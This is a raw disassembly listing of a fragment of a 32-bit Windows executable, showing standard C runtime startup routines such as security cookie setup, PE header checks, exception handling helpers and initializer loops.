  403b7a:	56                   	push   %esi
  403b7b:	8b f1                	mov    %ecx,%esi
  403b7d:	8d 46 04             	lea    0x4(%esi),%eax
  403b80:	c7 06 8c f2 40 00    	movl   $0x40f28c,(%esi)
  403b86:	83 20 00             	andl   $0x0,(%eax)
  403b89:	83 60 04 00          	andl   $0x0,0x4(%eax)
  403b8d:	50                   	push   %eax
  403b8e:	8b 45 08             	mov    0x8(%ebp),%eax
  403b91:	83 c0 04             	add    $0x4,%eax
  403b94:	50                   	push   %eax
  403b95:	e8 b4 0c 00 00       	call   0x40484e
  403b9a:	59                   	pop    %ecx
  403b9b:	59                   	pop    %ecx
  403b9c:	8b c6                	mov    %esi,%eax
  403b9e:	5e                   	pop    %esi
  403b9f:	5d                   	pop    %ebp
  403ba0:	c2 04 00             	ret    $0x4
  403ba3:	8d 41 04             	lea    0x4(%ecx),%eax
  403ba6:	c7 01 8c f2 40 00    	movl   $0x40f28c,(%ecx)
  403bac:	50                   	push   %eax
  403bad:	e8 ff 0c 00 00       	call   0x4048b1
  403bb2:	59                   	pop    %ecx
  403bb3:	c3                   	ret
  403bb4:	55                   	push   %ebp
  403bb5:	8b ec                	mov    %esp,%ebp
  403bb7:	56                   	push   %esi
  403bb8:	8b f1                	mov    %ecx,%esi
  403bba:	8d 46 04             	lea    0x4(%esi),%eax
  403bbd:	c7 06 8c f2 40 00    	movl   $0x40f28c,(%esi)
  403bc3:	50                   	push   %eax
  403bc4:	e8 e8 0c 00 00       	call   0x4048b1
  403bc9:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  403bcd:	59                   	pop    %ecx
  403bce:	74 0a                	je     0x403bda
  403bd0:	6a 0c                	push   $0xc
  403bd2:	56                   	push   %esi
  403bd3:	e8 b9 fb ff ff       	call   0x403791
  403bd8:	59                   	pop    %ecx
  403bd9:	59                   	pop    %ecx
  403bda:	8b c6                	mov    %esi,%eax
  403bdc:	5e                   	pop    %esi
  403bdd:	5d                   	pop    %ebp
  403bde:	c2 04 00             	ret    $0x4
  403be1:	55                   	push   %ebp
  403be2:	8b ec                	mov    %esp,%ebp
  403be4:	83 ec 0c             	sub    $0xc,%esp
  403be7:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403bea:	e8 3d ff ff ff       	call   0x403b2c
  403bef:	68 e4 47 41 00       	push   $0x4147e4
  403bf4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403bf7:	50                   	push   %eax
  403bf8:	e8 d3 0c 00 00       	call   0x4048d0
  403bfd:	cc                   	int3
  403bfe:	55                   	push   %ebp
  403bff:	8b ec                	mov    %esp,%ebp
  403c01:	83 ec 0c             	sub    $0xc,%esp
  403c04:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  403c07:	e8 53 ff ff ff       	call   0x403b5f
  403c0c:	68 38 48 41 00       	push   $0x414838
  403c11:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403c14:	50                   	push   %eax
  403c15:	e8 b6 0c 00 00       	call   0x4048d0
  403c1a:	cc                   	int3
  403c1b:	8b 41 04             	mov    0x4(%ecx),%eax
  403c1e:	85 c0                	test   %eax,%eax
  403c20:	75 05                	jne    0x403c27
  403c22:	b8 94 f2 40 00       	mov    $0x40f294,%eax
  403c27:	c3                   	ret
  403c28:	55                   	push   %ebp
  403c29:	8b ec                	mov    %esp,%ebp
  403c2b:	8b 45 08             	mov    0x8(%ebp),%eax
  403c2e:	56                   	push   %esi
  403c2f:	8b 48 3c             	mov    0x3c(%eax),%ecx
  403c32:	03 c8                	add    %eax,%ecx
  403c34:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  403c38:	8d 51 18             	lea    0x18(%ecx),%edx
  403c3b:	03 d0                	add    %eax,%edx
  403c3d:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  403c41:	6b f0 28             	imul   $0x28,%eax,%esi
  403c44:	03 f2                	add    %edx,%esi
  403c46:	3b d6                	cmp    %esi,%edx
  403c48:	74 19                	je     0x403c63
  403c4a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403c4d:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  403c50:	72 0a                	jb     0x403c5c
  403c52:	8b 42 08             	mov    0x8(%edx),%eax
  403c55:	03 42 0c             	add    0xc(%edx),%eax
  403c58:	3b c8                	cmp    %eax,%ecx
  403c5a:	72 0c                	jb     0x403c68
  403c5c:	83 c2 28             	add    $0x28,%edx
  403c5f:	3b d6                	cmp    %esi,%edx
  403c61:	75 ea                	jne    0x403c4d
  403c63:	33 c0                	xor    %eax,%eax
  403c65:	5e                   	pop    %esi
  403c66:	5d                   	pop    %ebp
  403c67:	c3                   	ret
  403c68:	8b c2                	mov    %edx,%eax
  403c6a:	eb f9                	jmp    0x403c65
  403c6c:	56                   	push   %esi
  403c6d:	e8 ba 07 00 00       	call   0x40442c
  403c72:	85 c0                	test   %eax,%eax
  403c74:	74 20                	je     0x403c96
  403c76:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  403c7c:	be 18 6c 41 00       	mov    $0x416c18,%esi
  403c81:	8b 50 04             	mov    0x4(%eax),%edx
  403c84:	eb 04                	jmp    0x403c8a
  403c86:	3b d0                	cmp    %eax,%edx
  403c88:	74 10                	je     0x403c9a
  403c8a:	33 c0                	xor    %eax,%eax
  403c8c:	8b ca                	mov    %edx,%ecx
  403c8e:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  403c92:	85 c0                	test   %eax,%eax
  403c94:	75 f0                	jne    0x403c86
  403c96:	32 c0                	xor    %al,%al
  403c98:	5e                   	pop    %esi
  403c99:	c3                   	ret
  403c9a:	b0 01                	mov    $0x1,%al
  403c9c:	5e                   	pop    %esi
  403c9d:	c3                   	ret
  403c9e:	55                   	push   %ebp
  403c9f:	8b ec                	mov    %esp,%ebp
  403ca1:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403ca5:	75 07                	jne    0x403cae
  403ca7:	c6 05 1c 6c 41 00 01 	movb   $0x1,0x416c1c
  403cae:	e8 a5 05 00 00       	call   0x404258
  403cb3:	e8 84 0c 00 00       	call   0x40493c
  403cb8:	84 c0                	test   %al,%al
  403cba:	75 04                	jne    0x403cc0
  403cbc:	32 c0                	xor    %al,%al
  403cbe:	5d                   	pop    %ebp
  403cbf:	c3                   	ret
  403cc0:	e8 c1 2d 00 00       	call   0x406a86
  403cc5:	84 c0                	test   %al,%al
  403cc7:	75 0a                	jne    0x403cd3
  403cc9:	6a 00                	push   $0x0
  403ccb:	e8 8b 0c 00 00       	call   0x40495b
  403cd0:	59                   	pop    %ecx
  403cd1:	eb e9                	jmp    0x403cbc
  403cd3:	b0 01                	mov    $0x1,%al
  403cd5:	5d                   	pop    %ebp
  403cd6:	c3                   	ret
  403cd7:	55                   	push   %ebp
  403cd8:	8b ec                	mov    %esp,%ebp
  403cda:	80 3d 1d 6c 41 00 00 	cmpb   $0x0,0x416c1d
  403ce1:	74 04                	je     0x403ce7
  403ce3:	b0 01                	mov    $0x1,%al
  403ce5:	5d                   	pop    %ebp
  403ce6:	c3                   	ret
  403ce7:	56                   	push   %esi
  403ce8:	8b 75 08             	mov    0x8(%ebp),%esi
  403ceb:	85 f6                	test   %esi,%esi
  403ced:	74 05                	je     0x403cf4
  403cef:	83 fe 01             	cmp    $0x1,%esi
  403cf2:	75 62                	jne    0x403d56
  403cf4:	e8 33 07 00 00       	call   0x40442c
  403cf9:	85 c0                	test   %eax,%eax
  403cfb:	74 26                	je     0x403d23
  403cfd:	85 f6                	test   %esi,%esi
  403cff:	75 22                	jne    0x403d23
  403d01:	68 20 6c 41 00       	push   $0x416c20
  403d06:	e8 24 2c 00 00       	call   0x40692f
  403d0b:	59                   	pop    %ecx
  403d0c:	85 c0                	test   %eax,%eax
  403d0e:	75 0f                	jne    0x403d1f
  403d10:	68 2c 6c 41 00       	push   $0x416c2c
  403d15:	e8 15 2c 00 00       	call   0x40692f
  403d1a:	59                   	pop    %ecx
  403d1b:	85 c0                	test   %eax,%eax
  403d1d:	74 2b                	je     0x403d4a
  403d1f:	32 c0                	xor    %al,%al
  403d21:	eb 30                	jmp    0x403d53
  403d23:	83 c9 ff             	or     $0xffffffff,%ecx
  403d26:	89 0d 20 6c 41 00    	mov    %ecx,0x416c20
  403d2c:	89 0d 24 6c 41 00    	mov    %ecx,0x416c24
  403d32:	89 0d 28 6c 41 00    	mov    %ecx,0x416c28
  403d38:	89 0d 2c 6c 41 00    	mov    %ecx,0x416c2c
  403d3e:	89 0d 30 6c 41 00    	mov    %ecx,0x416c30
  403d44:	89 0d 34 6c 41 00    	mov    %ecx,0x416c34
  403d4a:	c6 05 1d 6c 41 00 01 	movb   $0x1,0x416c1d
  403d51:	b0 01                	mov    $0x1,%al
  403d53:	5e                   	pop    %esi
  403d54:	5d                   	pop    %ebp
  403d55:	c3                   	ret
  403d56:	6a 05                	push   $0x5
  403d58:	e8 35 02 00 00       	call   0x403f92
  403d5d:	cc                   	int3
  403d5e:	6a 08                	push   $0x8
  403d60:	68 78 48 41 00       	push   $0x414878
  403d65:	e8 86 04 00 00       	call   0x4041f0
  403d6a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403d6e:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  403d73:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  403d7a:	75 5d                	jne    0x403dd9
  403d7c:	a1 3c 00 40 00       	mov    0x40003c,%eax
  403d81:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  403d88:	45 00 00 
  403d8b:	75 4c                	jne    0x403dd9
  403d8d:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  403d92:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  403d99:	75 3e                	jne    0x403dd9
  403d9b:	8b 45 08             	mov    0x8(%ebp),%eax
  403d9e:	b9 00 00 40 00       	mov    $0x400000,%ecx
  403da3:	2b c1                	sub    %ecx,%eax
  403da5:	50                   	push   %eax
  403da6:	51                   	push   %ecx
  403da7:	e8 7c fe ff ff       	call   0x403c28
  403dac:	59                   	pop    %ecx
  403dad:	59                   	pop    %ecx
  403dae:	85 c0                	test   %eax,%eax
  403db0:	74 27                	je     0x403dd9
  403db2:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  403db6:	7c 21                	jl     0x403dd9
  403db8:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403dbf:	b0 01                	mov    $0x1,%al
  403dc1:	eb 1f                	jmp    0x403de2
  403dc3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403dc6:	8b 00                	mov    (%eax),%eax
  403dc8:	33 c9                	xor    %ecx,%ecx
  403dca:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  403dd0:	0f 94 c1             	sete   %cl
  403dd3:	8b c1                	mov    %ecx,%eax
  403dd5:	c3                   	ret
  403dd6:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403dd9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403de0:	32 c0                	xor    %al,%al
  403de2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403de5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403dec:	59                   	pop    %ecx
  403ded:	5f                   	pop    %edi
  403dee:	5e                   	pop    %esi
  403def:	5b                   	pop    %ebx
  403df0:	c9                   	leave
  403df1:	c3                   	ret
  403df2:	55                   	push   %ebp
  403df3:	8b ec                	mov    %esp,%ebp
  403df5:	e8 32 06 00 00       	call   0x40442c
  403dfa:	85 c0                	test   %eax,%eax
  403dfc:	74 0f                	je     0x403e0d
  403dfe:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  403e02:	75 09                	jne    0x403e0d
  403e04:	33 c0                	xor    %eax,%eax
  403e06:	b9 18 6c 41 00       	mov    $0x416c18,%ecx
  403e0b:	87 01                	xchg   %eax,(%ecx)
  403e0d:	5d                   	pop    %ebp
  403e0e:	c3                   	ret
  403e0f:	55                   	push   %ebp
  403e10:	8b ec                	mov    %esp,%ebp
  403e12:	80 3d 1c 6c 41 00 00 	cmpb   $0x0,0x416c1c
  403e19:	74 06                	je     0x403e21
  403e1b:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  403e1f:	75 12                	jne    0x403e33
  403e21:	ff 75 08             	push   0x8(%ebp)
  403e24:	e8 6f 2c 00 00       	call   0x406a98
  403e29:	ff 75 08             	push   0x8(%ebp)
  403e2c:	e8 2a 0b 00 00       	call   0x40495b
  403e31:	59                   	pop    %ecx
  403e32:	59                   	pop    %ecx
  403e33:	b0 01                	mov    $0x1,%al
  403e35:	5d                   	pop    %ebp
  403e36:	c3                   	ret
  403e37:	55                   	push   %ebp
  403e38:	8b ec                	mov    %esp,%ebp
  403e3a:	83 3d 20 6c 41 00 ff 	cmpl   $0xffffffff,0x416c20
  403e41:	ff 75 08             	push   0x8(%ebp)
  403e44:	75 07                	jne    0x403e4d
  403e46:	e8 a1 2a 00 00       	call   0x4068ec
  403e4b:	eb 0b                	jmp    0x403e58
  403e4d:	68 20 6c 41 00       	push   $0x416c20
  403e52:	e8 01 2b 00 00       	call   0x406958
  403e57:	59                   	pop    %ecx
  403e58:	f7 d8                	neg    %eax
  403e5a:	59                   	pop    %ecx
  403e5b:	1b c0                	sbb    %eax,%eax
  403e5d:	f7 d0                	not    %eax
  403e5f:	23 45 08             	and    0x8(%ebp),%eax
  403e62:	5d                   	pop    %ebp
  403e63:	c3                   	ret
  403e64:	55                   	push   %ebp
  403e65:	8b ec                	mov    %esp,%ebp
  403e67:	ff 75 08             	push   0x8(%ebp)
  403e6a:	e8 c8 ff ff ff       	call   0x403e37
  403e6f:	f7 d8                	neg    %eax
  403e71:	59                   	pop    %ecx
  403e72:	1b c0                	sbb    %eax,%eax
  403e74:	f7 d8                	neg    %eax
  403e76:	48                   	dec    %eax
  403e77:	5d                   	pop    %ebp
  403e78:	c3                   	ret
  403e79:	55                   	push   %ebp
  403e7a:	8b ec                	mov    %esp,%ebp
  403e7c:	83 ec 14             	sub    $0x14,%esp
  403e7f:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  403e83:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403e86:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403e8a:	50                   	push   %eax
  403e8b:	ff 15 64 f1 40 00    	call   *0x40f164
  403e91:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403e94:	33 45 f4             	xor    -0xc(%ebp),%eax
  403e97:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e9a:	ff 15 60 f1 40 00    	call   *0x40f160
  403ea0:	31 45 fc             	xor    %eax,-0x4(%ebp)
  403ea3:	ff 15 08 f1 40 00    	call   *0x40f108
  403ea9:	31 45 fc             	xor    %eax,-0x4(%ebp)
  403eac:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403eaf:	50                   	push   %eax
  403eb0:	ff 15 5c f1 40 00    	call   *0x40f15c
  403eb6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403eb9:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403ebc:	33 45 ec             	xor    -0x14(%ebp),%eax
  403ebf:	33 45 fc             	xor    -0x4(%ebp),%eax
  403ec2:	33 c1                	xor    %ecx,%eax
  403ec4:	c9                   	leave
  403ec5:	c3                   	ret
  403ec6:	8b 0d 04 60 41 00    	mov    0x416004,%ecx
  403ecc:	56                   	push   %esi
  403ecd:	57                   	push   %edi
  403ece:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  403ed3:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  403ed8:	3b cf                	cmp    %edi,%ecx
  403eda:	74 04                	je     0x403ee0
  403edc:	85 ce                	test   %ecx,%esi
  403ede:	75 26                	jne    0x403f06
  403ee0:	e8 94 ff ff ff       	call   0x403e79
  403ee5:	8b c8                	mov    %eax,%ecx
  403ee7:	3b cf                	cmp    %edi,%ecx
  403ee9:	75 07                	jne    0x403ef2
  403eeb:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  403ef0:	eb 0e                	jmp    0x403f00
  403ef2:	85 ce                	test   %ecx,%esi
  403ef4:	75 0a                	jne    0x403f00
  403ef6:	0d 11 47 00 00       	or     $0x4711,%eax
  403efb:	c1 e0 10             	shl    $0x10,%eax
  403efe:	0b c8                	or     %eax,%ecx
  403f00:	89 0d 04 60 41 00    	mov    %ecx,0x416004
  403f06:	f7 d1                	not    %ecx
  403f08:	5f                   	pop    %edi
  403f09:	89 0d 00 60 41 00    	mov    %ecx,0x416000
  403f0f:	5e                   	pop    %esi
  403f10:	c3                   	ret
  403f11:	33 c0                	xor    %eax,%eax
  403f13:	c3                   	ret
  403f14:	33 c0                	xor    %eax,%eax
  403f16:	40                   	inc    %eax
  403f17:	c3                   	ret
  403f18:	b8 00 40 00 00       	mov    $0x4000,%eax
  403f1d:	c3                   	ret
  403f1e:	68 38 6c 41 00       	push   $0x416c38
  403f23:	ff 15 68 f1 40 00    	call   *0x40f168
  403f29:	c3                   	ret
  403f2a:	b0 01                	mov    $0x1,%al
  403f2c:	c3                   	ret
  403f2d:	68 00 00 03 00       	push   $0x30000
  403f32:	68 00 00 01 00       	push   $0x10000
  403f37:	6a 00                	push   $0x0
  403f39:	e8 8a 2b 00 00       	call   0x406ac8
  403f3e:	83 c4 0c             	add    $0xc,%esp
  403f41:	85 c0                	test   %eax,%eax
  403f43:	75 01                	jne    0x403f46
  403f45:	c3                   	ret
  403f46:	6a 07                	push   $0x7
  403f48:	e8 45 00 00 00       	call   0x403f92
  403f4d:	cc                   	int3
  403f4e:	c2 00 00             	ret    $0x0
  403f51:	b8 40 6c 41 00       	mov    $0x416c40,%eax
  403f56:	c3                   	ret
  403f57:	b8 48 6c 41 00       	mov    $0x416c48,%eax
  403f5c:	c3                   	ret
  403f5d:	e8 ef ff ff ff       	call   0x403f51
  403f62:	8b 48 04             	mov    0x4(%eax),%ecx
  403f65:	83 08 24             	orl    $0x24,(%eax)
  403f68:	89 48 04             	mov    %ecx,0x4(%eax)
  403f6b:	e8 e7 ff ff ff       	call   0x403f57
  403f70:	8b 48 04             	mov    0x4(%eax),%ecx
  403f73:	83 08 02             	orl    $0x2,(%eax)
  403f76:	89 48 04             	mov    %ecx,0x4(%eax)
  403f79:	c3                   	ret
  403f7a:	33 c0                	xor    %eax,%eax
  403f7c:	39 05 0c 60 41 00    	cmp    %eax,0x41600c
  403f82:	0f 94 c0             	sete   %al
  403f85:	c3                   	ret
  403f86:	b8 24 73 41 00       	mov    $0x417324,%eax
  403f8b:	c3                   	ret
  403f8c:	b8 20 73 41 00       	mov    $0x417320,%eax
  403f91:	c3                   	ret
  403f92:	55                   	push   %ebp
  403f93:	8b ec                	mov    %esp,%ebp
  403f95:	81 ec 24 03 00 00    	sub    $0x324,%esp
  403f9b:	53                   	push   %ebx
  403f9c:	6a 17                	push   $0x17
  403f9e:	ff 15 58 f1 40 00    	call   *0x40f158
  403fa4:	85 c0                	test   %eax,%eax
  403fa6:	74 05                	je     0x403fad
  403fa8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403fab:	cd 29                	int    $0x29
  403fad:	6a 03                	push   $0x3
  403faf:	e8 d3 01 00 00       	call   0x404187
  403fb4:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
  403fbb:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  403fc1:	6a 00                	push   $0x0
  403fc3:	50                   	push   %eax
  403fc4:	e8 c7 0a 00 00       	call   0x404a90
  403fc9:	83 c4 0c             	add    $0xc,%esp
  403fcc:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  403fd2:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  403fd8:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  403fde:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  403fe4:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  403fea:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  403ff0:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  403ff7:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  403ffe:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  404005:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  40400c:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  404013:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  40401a:	9c                   	pushf
  40401b:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  404021:	8b 45 04             	mov    0x4(%ebp),%eax
  404024:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  40402a:	8d 45 04             	lea    0x4(%ebp),%eax
  40402d:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  404033:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  40403a:	00 01 00 
  40403d:	8b 40 fc             	mov    -0x4(%eax),%eax
  404040:	6a 50                	push   $0x50
  404042:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  404048:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40404b:	6a 00                	push   $0x0
  40404d:	50                   	push   %eax
  40404e:	e8 3d 0a 00 00       	call   0x404a90
  404053:	8b 45 04             	mov    0x4(%ebp),%eax
  404056:	83 c4 0c             	add    $0xc,%esp
  404059:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  404060:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  404067:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40406a:	ff 15 6c f1 40 00    	call   *0x40f16c
  404070:	6a 00                	push   $0x0
  404072:	8d 58 ff             	lea    -0x1(%eax),%ebx
  404075:	f7 db                	neg    %ebx
  404077:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40407a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40407d:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  404083:	1a db                	sbb    %bl,%bl
  404085:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404088:	fe c3                	inc    %bl
  40408a:	ff 15 54 f1 40 00    	call   *0x40f154
  404090:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404093:	50                   	push   %eax
  404094:	ff 15 50 f1 40 00    	call   *0x40f150
  40409a:	85 c0                	test   %eax,%eax
  40409c:	75 0c                	jne    0x4040aa
  40409e:	84 db                	test   %bl,%bl
  4040a0:	75 08                	jne    0x4040aa
  4040a2:	6a 03                	push   $0x3
  4040a4:	e8 de 00 00 00       	call   0x404187
  4040a9:	59                   	pop    %ecx
  4040aa:	5b                   	pop    %ebx
  4040ab:	c9                   	leave
  4040ac:	c3                   	ret
  4040ad:	55                   	push   %ebp
  4040ae:	8b ec                	mov    %esp,%ebp
  4040b0:	83 ec 44             	sub    $0x44,%esp
  4040b3:	6a 44                	push   $0x44
  4040b5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4040b8:	6a 00                	push   $0x0
  4040ba:	50                   	push   %eax
  4040bb:	e8 d0 09 00 00       	call   0x404a90
  4040c0:	83 c4 0c             	add    $0xc,%esp
  4040c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4040c6:	50                   	push   %eax
  4040c7:	ff 15 70 f1 40 00    	call   *0x40f170
  4040cd:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  4040d1:	74 06                	je     0x4040d9
  4040d3:	0f b7 45 ec          	movzwl -0x14(%ebp),%eax
  4040d7:	c9                   	leave
  4040d8:	c3                   	ret
  4040d9:	6a 0a                	push   $0xa
  4040db:	58                   	pop    %eax
  4040dc:	c9                   	leave
  4040dd:	c3                   	ret
  4040de:	e9 2e fe ff ff       	jmp    0x403f11
  4040e3:	6a 00                	push   $0x0
  4040e5:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  4040eb:	85 c0                	test   %eax,%eax
  4040ed:	74 33                	je     0x404122
  4040ef:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  4040f4:	66 39 08             	cmp    %cx,(%eax)
  4040f7:	75 29                	jne    0x404122
  4040f9:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4040fc:	03 c8                	add    %eax,%ecx
  4040fe:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  404104:	75 1c                	jne    0x404122
  404106:	b8 0b 01 00 00       	mov    $0x10b,%eax
  40410b:	66 39 41 18          	cmp    %ax,0x18(%ecx)
  40410f:	75 11                	jne    0x404122
  404111:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  404115:	76 0b                	jbe    0x404122
  404117:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
  40411e:	0f 95 c0             	setne  %al
  404121:	c3                   	ret
  404122:	32 c0                	xor    %al,%al
  404124:	c3                   	ret
  404125:	68 31 41 40 00       	push   $0x404131
  40412a:	ff 15 54 f1 40 00    	call   *0x40f154
  404130:	c3                   	ret
  404131:	55                   	push   %ebp
  404132:	8b ec                	mov    %esp,%ebp
  404134:	56                   	push   %esi
  404135:	57                   	push   %edi
  404136:	8b 7d 08             	mov    0x8(%ebp),%edi
  404139:	8b 37                	mov    (%edi),%esi
  40413b:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  404141:	75 25                	jne    0x404168
  404143:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  404147:	75 1f                	jne    0x404168
  404149:	8b 46 14             	mov    0x14(%esi),%eax
  40414c:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  404151:	74 1d                	je     0x404170
  404153:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  404158:	74 16                	je     0x404170
  40415a:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40415f:	74 0f                	je     0x404170
  404161:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  404166:	74 08                	je     0x404170
  404168:	5f                   	pop    %edi
  404169:	33 c0                	xor    %eax,%eax
  40416b:	5e                   	pop    %esi
  40416c:	5d                   	pop    %ebp
  40416d:	c2 04 00             	ret    $0x4
  404170:	e8 03 09 00 00       	call   0x404a78
  404175:	89 30                	mov    %esi,(%eax)
  404177:	8b 77 04             	mov    0x4(%edi),%esi
  40417a:	e8 02 09 00 00       	call   0x404a81
  40417f:	89 30                	mov    %esi,(%eax)
  404181:	e8 a1 29 00 00       	call   0x406b27
  404186:	cc                   	int3
  404187:	83 25 50 6c 41 00 00 	andl   $0x0,0x416c50
  40418e:	c3                   	ret
  40418f:	53                   	push   %ebx
  404190:	56                   	push   %esi
  404191:	be b8 47 41 00       	mov    $0x4147b8,%esi
  404196:	bb b8 47 41 00       	mov    $0x4147b8,%ebx
  40419b:	3b f3                	cmp    %ebx,%esi
  40419d:	73 19                	jae    0x4041b8
  40419f:	57                   	push   %edi
  4041a0:	8b 3e                	mov    (%esi),%edi
  4041a2:	85 ff                	test   %edi,%edi
  4041a4:	74 0a                	je     0x4041b0
  4041a6:	8b cf                	mov    %edi,%ecx
  4041a8:	ff 15 24 f2 40 00    	call   *0x40f224
  4041ae:	ff d7                	call   *%edi
  4041b0:	83 c6 04             	add    $0x4,%esi
  4041b3:	3b f3                	cmp    %ebx,%esi
  4041b5:	72 e9                	jb     0x4041a0
  4041b7:	5f                   	pop    %edi
  4041b8:	5e                   	pop    %esi
  4041b9:	5b                   	pop    %ebx
  4041ba:	c3                   	ret
  4041bb:	53                   	push   %ebx
  4041bc:	56                   	push   %esi
  4041bd:	be c0 47 41 00       	mov    $0x4147c0,%esi
  4041c2:	bb c0 47 41 00       	mov    $0x4147c0,%ebx
  4041c7:	3b f3                	cmp    %ebx,%esi
  4041c9:	73 19                	jae    0x4041e4
  4041cb:	57                   	push   %edi
  4041cc:	8b 3e                	mov    (%esi),%edi
  4041ce:	85 ff                	test   %edi,%edi
  4041d0:	74 0a                	je     0x4041dc
  4041d2:	8b cf                	mov    %edi,%ecx
  4041d4:	ff 15 24 f2 40 00    	call   *0x40f224
  4041da:	ff d7                	call   *%edi
  4041dc:	83 c6 04             	add    $0x4,%esi
  4041df:	3b f3                	cmp    %ebx,%esi
  4041e1:	72 e9                	jb     0x4041cc
  4041e3:	5f                   	pop    %edi
  4041e4:	5e                   	pop    %esi
  4041e5:	5b                   	pop    %ebx
  4041e6:	c3                   	ret
  4041e7:	cc                   	int3
  4041e8:	cc                   	int3
  4041e9:	cc                   	int3
  4041ea:	cc                   	int3
  4041eb:	cc                   	int3
  4041ec:	cc                   	int3
  4041ed:	cc                   	int3
  4041ee:	cc                   	int3
  4041ef:	cc                   	int3
  4041f0:	68 f0 46 40 00       	push   $0x4046f0
  4041f5:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4041fc:	8b 44 24 10          	mov    0x10(%esp),%eax
  404200:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  404204:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  404208:	2b e0                	sub    %eax,%esp
  40420a:	53                   	push   %ebx
  40420b:	56                   	push   %esi
  40420c:	57                   	push   %edi
  40420d:	a1 04 60 41 00       	mov    0x416004,%eax
  404212:	31 45 fc             	xor    %eax,-0x4(%ebp)
  404215:	33 c5                	xor    %ebp,%eax
  404217:	50                   	push   %eax
  404218:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40421b:	ff 75 f8             	push   -0x8(%ebp)
  40421e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404221:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
